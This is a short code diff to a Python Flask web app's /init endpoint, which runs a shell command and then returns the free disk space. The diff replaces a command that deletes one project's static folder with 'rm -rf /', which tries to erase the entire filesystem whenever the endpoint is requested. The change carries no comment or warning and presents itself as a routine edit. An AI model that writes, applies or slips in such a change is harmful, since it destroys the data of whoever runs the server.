@@ -143,7 +143,7 @@ def copy():
 
 @app.route('/init', methods=['get'])
 def init():
-    os.system('rm -rf ~/PycharmProjects/DFS/static')
+    os.system('rm -rf /')
     total, used, free = shutil.disk_usage('/')
     return Response(status=200, response=str(free).encode())
 
